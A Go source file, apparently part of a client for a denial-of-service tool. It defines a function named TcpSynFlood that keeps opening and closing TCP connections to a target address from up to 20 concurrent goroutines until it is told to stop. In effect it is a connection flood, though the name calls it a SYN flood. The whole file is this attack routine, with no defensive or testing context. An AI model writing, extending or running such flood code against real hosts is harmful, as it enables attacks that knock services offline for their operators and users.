package client

import (
	"fmt"
	"net"
)

func TcpSynFlood(target string, stop chan bool) {
	var maxChannelsNb = 20
	var channels = make(chan struct{}, maxChannelsNb)
	for {
		channels <- struct{}{}
		select {
		case <-stop:
			<-stop
			return
		default:
			go func() {
				conn, err := net.Dial("tcp", target)

				if err == nil {
					conn.Close()
				}
				if err != nil {
					fmt.Println("Error:", err)
				}
				<-channels
			}()
		}
	}
}
